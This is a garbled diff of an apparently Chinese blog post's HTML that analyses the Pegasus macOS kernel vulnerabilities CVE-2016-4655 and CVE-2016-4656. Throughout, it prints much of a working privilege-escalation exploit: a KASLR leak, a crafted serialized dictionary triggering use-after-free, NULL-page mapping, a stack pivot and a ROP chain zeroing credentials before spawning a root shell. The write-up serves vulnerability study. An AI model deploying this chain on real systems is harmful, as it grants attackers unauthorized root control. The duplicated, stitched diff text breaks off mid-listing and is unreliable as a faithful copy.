-<p>…<br>else if( (off = OSDynamicCast( OSNumber, obj ))) {<br>    offsetBytes = off-&gt;unsigned64BitValue(); /<em> j: the offsetBytes variable is allocated on the stack </em>/<br>    len = off-&gt;numberOfBytes(); /<em> j: this reads out our malformed length, 0x200 </em>/<br>    bytes = &offsetBytes; /<em> j: bytes</em> ptr points to a stack variable */</p>
-<pre><code>...
-</code></pre><p>}<br>…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">然后</div></pre></td></tr></table></figure></p>
-<p>if( bytes) {<br>    if( <em>dataCnt &lt; len)<br>        ret = kIOReturnIPCError;<br>    else {
-        </em>dataCnt = len;<br>        bcopy( bytes, buf, len ); /<em> j: this leaks data from the stack </em>/<br>    }<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">执行`bcopy`时，从`bytes`里读取了错误的长度，指向堆栈变量，泄漏函数返回地址，我们只需要找到一个地址减去静态地址，那么就能计算出内核偏移值</div><div class="line"></div><div class="line">#### 计算内核偏移</div><div class="line">将`/System/Library/Kernels/kernel`拖入hopper，搜索`is_io_registry_entry_get_property_bytes`，如下图  </div><div class="line"></div><div class="line">![0-0](/Users/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-0.png </div><div class="line">)</div><div class="line"></div><div class="line">然后通过Xref找到调用的下一条地址即返回地址，最后将之前偏移后的地址-静态地址就等到了内核偏移值</div></pre></td></tr></table></figure></p>
-<p>0xffffff80037934bf - 0xffffff80003934bf = 0x3400000<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">也就是下面这段代码所示：</div></pre></td></tr></table></figure></p>
-<p>uint64_t hardcoded_ret_addr = 0xffffff80003934bf;</p>
-<p>kslide = (<em>(uint64_t </em>)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;</p>
-<p>printf(“(i) KASLR slide is %#016llx\n”, kslide);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">现在获取到了内核偏移值就可以利用UAF漏洞执行ROP链然后提权root。here we go！</div><div class="line"></div><div class="line">### CVE-2016-4656-UAF漏洞利用</div><div class="line">XNU的堆分配器被称为zalloc，这次我可以偷下懒了，与我之前分析得linux堆分配器相比虽然细节上可能有所不同，但基本原理都大同小异，简单的说来就是提供了不同的分配表，free后的元素会放入对应大小的链表之中，且位于最后，即如果时间合适，我们下次分配同样大小的内存就会返回刚free的内存。还不清楚的可以移步[深入理解Linux堆分配器-DLMalloc](https://null-me.github.io/2017/04/23/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/)这篇分析。  </div><div class="line">那么下面要做的就是如何构造下一个分配的对象，这里我们用`OSData`因为可以使用原生的二进制数据。回忆之前的UAF漏洞，当下一次`o-&gt;retain`引用就会触发，这里涉及到一个C++虚拟函数表的问题，当然我之前也分析过，不清楚的可以移步[详解virtual table](https://null-me.github.io/2017/03/07/C++%20Virtual%20table/%E8%AF%A6%E8%A7%A3virtual%20table/)简单说来一个对象的地址实际指向的是vtable，通过vtable就能找到对应的函数。所以我们可以构造假的vtable地址达到控制rip到自定义的地址。当然这里还有另一个技术-map NULL。为了能够有效的利用和控制，因为其他地址可能被修改，我们如果能在NULL段进行shellcode以及ROP链的部署那么就能稳定的利用。  </div><div class="line">下面看我们的步骤：  </div><div class="line"></div><div class="line"> * 制作一个二进制字典，释放`OSString`并重新分配`OSData`。</div><div class="line"> * Map NULL</div><div class="line"> * 放置stack pivot在偏移0x20到NULL页面</div><div class="line"> * 将一个小的传输链0x0放置在NULL页面中（这将传递执行到主链）</div><div class="line"> * 触发漏洞</div><div class="line"> * 提升权限，生成shell</div><div class="line"></div><div class="line">下面看完整的Poc代码：</div></pre></td></tr></table></figure></p>
-<p>void use_after_free(void)<br>{<br>    kern_return_t kr = 0;<br>    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;</p>
-<pre><code>/* craft the dictionary */
+    &lt;symbol&gt;BBB&lt;/symbol&gt;
+    &lt;data&gt;
+        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    &lt;/data&gt;
 
-printf(&quot;(i) Crafting dictionary...\n&quot;);
-
-void *dict = calloc(1, 512);
-uint32_t idx = 0; // index into our data
-</code></pre><p>#define WRITE_IN(dict, data) do { <em>(uint32_t </em>)(dict + idx) = (data); idx += 4; } while (0)</p>
-<pre><code>WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning
-
-WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 6)); // dict with 6 entries
-
-WRITE_IN(dict, (kOSSerializeString | 4));   // string &apos;AAA&apos;, will get freed
-WRITE_IN(dict, (0x00414141));
-
-WRITE_IN(dict, (kOSSerializeBoolean | 1));  // bool, true
-
-WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol &apos;BBB&apos;
-WRITE_IN(dict, (0x00424242));
-
-WRITE_IN(dict, (kOSSerializeData | 32));    // data (0x00 * 32)
-WRITE_IN(dict, (0x00000000));
-WRITE_IN(dict, (0x00000000));
-WRITE_IN(dict, (0x00000000));
-WRITE_IN(dict, (0x00000000));
-WRITE_IN(dict, (0x00000000));
-WRITE_IN(dict, (0x00000000));
-WRITE_IN(dict, (0x00000000));
-WRITE_IN(dict, (0x00000000));
-
-WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol &apos;CCC&apos;
-WRITE_IN(dict, (0x00434343));
-
-WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeObject | 1));   // ref to object 1 (OSString)
-
-/* map the NULL page */
-
-mach_vm_address_t null_map = 0;
+    &lt;symbol&gt;CCC&lt;/symbol&gt;
+    &lt;reference&gt;1&lt;/reference&gt; &lt;!--引用第一个string元素--&gt;
+&lt;/dict&gt;
+</code></pre><p>当执行<code>retain</code>时就会以0x20的偏移量地址读取，也就是rip其值将为0x20<br>可能你会疑惑，0x20地址处不是应该处于__PAGEZERO段吗？是这样的，所以下面介绍Map NULL技术</p>
+<h4 id="Map-NULL"><a href="#Map-NULL" class="headerlink" title="Map NULL"></a>Map NULL</h4><p>苹果并没有对32位强制限制不能map，具体我在Google上搜到了这些答案：<br><img src="/4ch12dy/4ch12dy.github.io.git/md_source/paper/Pegasus内核漏洞及PoC分析/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-1.png" alt="0-1"><br>意思就是我们可以将__PAGEZERO段重新映射为可用段，就可以将ROP链布置上去。  </p>
+<pre><code>mach_vm_address_t null_map = 0;
 
 vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE);
 
 kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0);
 if (kr != KERN_SUCCESS)
     return;
-
-macho_map_t *map = map_file_with_path(KERNEL_PATH_ON_DISK);
-
-printf(&quot;(i) Leaking kslide...\n&quot;);
-
-SET_KERNEL_SLIDE(kslide_infoleak()); // set global kernel slide
-
-/* set the stack pivot at 0x20 */
-
-*(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot
-
-/* build ROP chain */
-
-printf(&quot;(i) Building ROP chain...\n&quot;);
-
-rop_chain_t *chain = calloc(1, sizeof(rop_chain_t));
+</code></pre><p>这段代码即禁用__PAGEZERO段和Map NULL，要达到目的，我们需要将二进制文件编译为32位，并包含pagezero_size,0标志  </p>
+<h3 id="Pivoting-stack和ROP链"><a href="#Pivoting-stack和ROP链" class="headerlink" title="Pivoting stack和ROP链"></a>Pivoting stack和ROP链</h3><p>下面的这部分内容和我之前分析的linux ROP技术类似，利用ret指令将栈中的地址pop到rip达到执行任意代码的目的。若不清楚，移步<a href="https://null-me.github.io/2017/04/13/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/" target="_blank" rel="external">Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip</a><br>首先将rip转移到0x20处</p>
+<pre><code>*(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot
+</code></pre><p>然后通过交换rsp和eax值，将rip转移到0x00位置处，这一步的目的即在__PAGEZERO段上控制栈结构，因为每是将rsp的值pop到ret中，这也就是stack pivot技术。</p>
+<pre><code>uint64_t *transfer = (uint64_t *)0x0;
+transfer[0] = ROP_POP_RSP(map);
+transfer[1] = (uint64_t)chain-&gt;chain;
+</code></pre><p>接着rip转移到<code>main-&gt;chain</code>，和前面一样ROP链一样，不过主链是为了达到提权的目的。<br>主链的代码  </p>
+<pre><code>rop_chain_t *chain = calloc(1, sizeof(rop_chain_t));
 
 PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;));
 
@@ -436,50 +828,250 @@ PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3));
 PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;));
 
 PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;));
+</code></pre><p>主链的执行过程其实原理并不复杂：</p>
+<pre><code> chain prototype:
 
-/* chain transfer, will redirect execution flow from 0x0 to our main chain above */
+ proc = current_proc();//找到当前程序的credentials结构
+ ucred = proc_ucred(proc);
+ posix_cred = posix_cred_get(ucred);
 
-uint64_t *transfer = (uint64_t *)0x0;
-transfer[0] = ROP_POP_RSP(map);
-transfer[1] = (uint64_t)chain-&gt;chain;
-
-/* trigger */
-
-printf(&quot;(+) All done! Triggering the bug!\n&quot;);
-
-host_get_io_master(mach_host_self(), &amp;master); // get iokit master port
+ bzero(posix_cred, (sizeof(int) * 3));//将组id设为0即提权为root
+ thread_exception_return();//thread_exception_return只是让我们离开内核区域而不会panic，通常用于从内核陷阱返回。
+</code></pre><p>接下来的代码和之前一样，测试我们构造的dic是否有效：</p>
+<pre><code>host_get_io_master(mach_host_self(), &amp;master); // get iokit master port
 
 kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);
 if (kr != KERN_SUCCESS)
     return;
-</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">这里有很多的宏定义函数，先不用管这些，整个PoC代码在文章最后将会在我的GitHub上找到  </div><div class="line">下面一步一步分析</div><div class="line"></div><div class="line">#### 构造字典</div><div class="line">将如下构造</div></pre></td></tr></table></figure></p>
-<p><dict><br>    <string>AAA</string><br>    <boolean>true</boolean></dict></p>
-<pre><code>&lt;symbol&gt;BBB&lt;/symbol&gt;
-&lt;data&gt;
-    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-&lt;/data&gt;
+</code></pre><p>最后如果一切都顺利，我们检查当前进程<code>getuid</code>是否等于0，如果是就提权root成功，然后调用<code>system(&quot;/bin/bash&quot;)</code>弹出一个shell！</p>
+<pre><code>if (getuid() == 0) {
+    puts(&quot;(+) got r00t!&quot;);
+    system(&quot;/bin/bash&quot;);
+}
+</code></pre><p>测试：<br><img src="/4ch12dy/4ch12dy.github.io.git/md_source/paper/Pegasus内核漏洞及PoC分析/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-2.png" alt="0-2"></p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>终于完了，如果认真的一步步分析过来，相信你一定有很多收获和感悟。谁不一样呢？当我一步步的咬着英文看了太多资料和别人的分析，当不熟悉一个领域的时候，会感到害怕，烦躁，困惑。当然在这之中，特别感谢看雪iOS安全小组的<a href="http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/" target="_blank" rel="external">黄大大</a>和<a href="http://blog.imjun.net/posts/restore-symbol-of-iOS-app/" target="_blank" rel="external">杨君大大</a>，给我了解答了很多困惑，很是感动。从准备分析到写完这篇文章，连续花了7天时间，庆幸自己坚持下来，学到了很多之前都不了解的技术。在分析这个漏洞及利用的时候，我才发现把之前学的linux堆栈漏洞的各个知识点都串了起来，包括-堆管理原理，ROP，Vtable等等等等。也印证了今天在微博上看到教主的那句话：<br><strong>学好书不求甚解，爱技术不论用处</strong>，当我去用之前所学去理解一个个知识点的时候才体会到后半句：<strong>没有会意便欣然忘食</strong></p>
+<p><strong>PoC</strong><br>完整的Poc代码在<a href="https://github.com/NULL-ME/PegasusX">这里</a></p>
+<p><strong>特别感谢</strong></p>
+<ul>
+<li><a href="http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/" target="_blank" rel="external">mrh</a> –这是黄大大的分析，黄大大是一个特别严谨细致的人，分析文章使人豁然开朗</li>
+<li><a href="https://jndok.github.io/2016/10/04/pegasus-writeup/" target="_blank" rel="external">jndok’s blog</a> –本文大多基于jndok的分析，可以去看看原文的分析</li>
+<li><a href="http://blog.imjun.net/posts/restore-symbol-of-iOS-app/" target="_blank" rel="external">杨君的小黑屋</a>–杨君大大特别有耐心，执着于技术，乐于分享技术</li>
+</ul>
+<p><strong>参考</strong><br>1.<a href="https://developer.apple.com/library/content/samplecode/SimpleUserClient/Listings/User_Client_Info_txt.html" target="_blank" rel="external">User Client Info.txt</a><br>2.<a href="https://www.blackhat.com/docs/eu-15/materials/eu-15-Todesco-Attacking-The-XNU-Kernal-In-El-Capitain.pdf" target="_blank" rel="external">Attacking-The-XNU-Kernal-In-El-Capitain</a><br>3.<a href="https://bazad.github.io/2016/05/mac-os-x-use-after-free/" target="_blank" rel="external">Mac OS X Privilege Escalation via Use-After-Free: CVE-2016-1828</a><br>4.<a href="http://ho.ax/downloads/Defiling-Mac-OS-X-Ruxcon.pdf" target="_blank" rel="external">Defiling-Mac-OS-X-Ruxcon</a><br>5.<a href="https://www.exploit-db.com/exploits/39925/" target="_blank" rel="external">Apple Mac OSX Kernel - Exploitable NULL Dereference in CoreCaptureResponder Due to Unchecked Return Value</a><br>6.<a href="http://www.cnblogs.com/huxiao-tee/p/4660352.html" target="_blank" rel="external">认真分析mmap：是什么 为什么 怎么用</a><br>7.<a href="http://ho.ax/posts/2012/02/resolving-kernel-symbols/" target="_blank" rel="external">Resolving kernel symbols</a>  </p>
+<p><strong>OSUnserializeBinary源码</strong></p>
+<pre><code>OSObject *
+OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString)
+{
+    OSObject ** objsArray;
+    uint32_t    objsCapacity;
+    uint32_t    objsIdx;
 
-&lt;symbol&gt;CCC&lt;/symbol&gt;
-&lt;reference&gt;1&lt;/reference&gt; &lt;!--引用第一个string元素--&gt;
-</code></pre><p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">当执行`retain`时就会以0x20的偏移量地址读取，也就是rip其值将为0x20  </div><div class="line">可能你会疑惑，0x20地址处不是应该处于__PAGEZERO段吗？是这样的，所以下面介绍Map NULL技术</div><div class="line"></div><div class="line">#### Map NULL</div><div class="line">苹果并没有对32位强制限制不能map，具体我在Google上搜到了这些答案：  </div><div class="line">![0-1](/Users/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-1.png </div><div class="line">)</div><div class="line">意思就是我们可以将__PAGEZERO段重新映射为可用段，就可以将ROP链布置上去。</div></pre></td></tr></table></figure></p>
-<p>mach_vm_address_t null_map = 0;</p>
-<p>vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE);</p>
-<p>kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0);<br>if (kr != KERN_SUCCESS)<br>    return;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">这段代码即禁用__PAGEZERO段和Map NULL，要达到目的，我们需要将二进制文件编译为32位，并包含pagezero_size,0标志  </div><div class="line"></div><div class="line">### Pivoting stack和ROP链</div><div class="line">下面的这部分内容和我之前分析的linux ROP技术类似，利用ret指令将栈中的地址pop到rip达到执行任意代码的目的。若不清楚，移步[Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip](https://null-me.github.io/2017/04/13/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/)  </div><div class="line">首先将rip转移到0x20处</div></pre></td></tr></table></figure></p>
-<p><em>(volatile uint64_t </em>)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">然后通过交换rsp和eax值，将rip转移到0x00位置处，这一步的目的即在__PAGEZERO段上控制栈结构，因为每是将rsp的值pop到ret中，这也就是stack pivot技术。</div></pre></td></tr></table></figure></p>
-<p>uint64_t <em>transfer = (uint64_t </em>)0x0;<br>transfer[0] = ROP_POP_RSP(map);<br>transfer[1] = (uint64_t)chain-&gt;chain;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">接着rip转移到`main-&gt;chain`，和前面一样ROP链一样，不过主链是为了达到提权的目的。  </div><div class="line">主链的代码</div></pre></td></tr></table></figure></p>
-<p>rop_chain_t *chain = calloc(1, sizeof(rop_chain_t));</p>
-<p>PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, “_current_proc”));</p>
-<p>PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);<br>PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, “_proc_ucred”));</p>
-<p>PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);<br>PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, “_posix_cred_get”));</p>
-<p>PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);<br>PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3));<br>PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, “_bzero”));</p>
-<p>PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, “_thread_exception_return”));<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">主链的执行过程其实原理并不复杂：</div></pre></td></tr></table></figure></p>
-<p> chain prototype:</p>
-<p> proc = current_proc();//找到当前程序的credentials结构<br> ucred = proc_ucred(proc);<br> posix_cred = posix_cred_get(ucred);</p>
-<p> bzero(posix_cred, (sizeof(int) * 3));//将组id设为0即提权为root<br> thread_exception_return();//thread_exception_return只是让我们离开内核区域而不会panic，通常用于从内核陷阱返回。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">接下来的代码和之前一样，测试我们构造的dic是否有效：</div></pre></td></tr></table></figure></p>
-<p>host_get_io_master(mach_host_self(), &amp;master); // get iokit master port</p>
-<p>kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);<br>if (kr != KERN_SUCCESS)<br>    return;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">最后如果一切都顺利，我们检查当前进程`getuid`是否等于0，如果是就提权root成功，然后调用`system(&quot;/bin/bash&quot;)`弹出一个shell！</div></pre></td></tr></table></figure></p>
-<p>if (getuid() == 0) {<br>    puts(“(+) got r00t!”);<br>    system(“/bin/bash”);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div></pre></td><td class="code"><pre><div class="line">测试：</div><div class="line">![0-2](/Users/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-2.png </div><div class="line">)</div><div class="line"></div><div class="line"></div><div class="line">## 0x04 总结</div><div class="line">终于完了，如果认真的一步步分析过来，相信你一定有很多收获和感悟。谁不一样呢？当我一步步的咬着英文看了太多资料和别人的分析，当不熟悉一个领域的时候，会感到害怕，烦躁，困惑。当然在这之中，特别感谢看雪iOS安全小组的[黄大大](http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/)和[杨君大大](http://blog.imjun.net/posts/restore-symbol-of-iOS-app/)，给我了解答了很多困惑，很是感动。从准备分析到写完这篇文章，连续花了7天时间，庆幸自己坚持下来，学到了很多之前都不了解的技术。在分析这个漏洞及利用的时候，我才发现把之前学的linux堆栈漏洞的各个知识点都串了起来，包括-堆管理原理，ROP，Vtable等等等等。也印证了今天在微博上看到教主的那句话：</div><div class="line">**学好书不求甚解，爱技术不论用处**，当我去用之前所学去理解一个个知识点的时候才体会到后半句：**没有会意便欣然忘食**</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">**PoC**</div><div class="line">完整的Poc代码在[这里](https://github.com/NULL-ME/PegasusX)</div><div class="line"></div><div class="line">**特别感谢**</div><div class="line"></div><div class="line">* [mrh](http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/) --这是黄大大的分析，黄大大是一个特别严谨细致的人，分析文章使人豁然开朗</div><div class="line">* [jndok&apos;s blog](https://jndok.github.io/2016/10/04/pegasus-writeup/) --本文大多基于jndok的分析，可以去看看原文的分析</div><div class="line">* [杨君的小黑屋](http://blog.imjun.net/posts/restore-symbol-of-iOS-app/)--杨君大大特别有耐心，执着于技术，乐于分享技术</div><div class="line"></div><div class="line"></div><div class="line">**参考**  </div><div class="line">1.[User Client Info.txt](https://developer.apple.com/library/content/samplecode/SimpleUserClient/Listings/User_Client_Info_txt.html)  </div><div class="line">2.[Attacking-The-XNU-Kernal-In-El-Capitain](https://www.blackhat.com/docs/eu-15/materials/eu-15-Todesco-Attacking-The-XNU-Kernal-In-El-Capitain.pdf)  </div><div class="line">3.[Mac OS X Privilege Escalation via Use-After-Free: CVE-2016-1828](https://bazad.github.io/2016/05/mac-os-x-use-after-free/)  </div><div class="line">4.[Defiling-Mac-OS-X-Ruxcon](http://ho.ax/downloads/Defiling-Mac-OS-X-Ruxcon.pdf)  </div><div class="line">5.[Apple Mac OSX Kernel - Exploitable NULL Dereference in CoreCaptureResponder Due to Unchecked Return Value](https://www.exploit-db.com/exploits/39925/)  </div><div class="line">6.[认真分析mmap：是什么 为什么 怎么用](http://www.cnblogs.com/huxiao-tee/p/4660352.html)  </div><div class="line">7.[Resolving kernel symbols](http://ho.ax/posts/2012/02/resolving-kernel-symbols/)  </div><div class="line"></div><div class="line">**OSUnserializeBinary源码**</div><div class="line"></div><div class="line">``` </div><div class="line">OSObject *</div><div class="line">OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString)</div><div class="line">&#123;</div><div class="line">	OSObject ** objsArray;</div><div class="line">	uint32_t    objsCapacity;</div><div class="line">	uint32_t    objsIdx;</div><div class="line"></div><div class="line">	OSObject ** stackArray;</div><div class="line">	uint32_t    stackCapacity;</div><div class="line">	uint32_t    stackIdx;</div><div class="line"></div><div class="line">    OSObject     * result;</div><div class="line">    OSObject     * parent;</div><div class="line">    OSDictionary * dict;</div><div class="line">    OSArray      * array;</div><div class="line">    OSSet        * set;</div><div class="line">    OSDictionary * newDict;</div><div class="line">    OSArray      * newArray;</div><div class="line">    OSSet        * newSet;</div><div class="line">    OSObject     * o;</div><div class="line">    OSSymbol     * sym;</div><div class="line"></div><div class="line">    size_t           bufferPos;</div><div class="line">    const uint32_t * next;</div><div class="line">    uint32_t         key, len, wordLen;</div><div class="line">    bool             end, newCollect, isRef;</div><div class="line">    unsigned long long value;</div><div class="line">    bool ok;</div><div class="line"></div><div class="line">	if (errorString) *errorString = 0;</div><div class="line">	if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL);</div><div class="line">	if (3 &amp; ((uintptr_t) buffer)) return (NULL);</div><div class="line">	if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL);</div><div class="line">	bufferPos = sizeof(kOSSerializeBinarySignature);</div><div 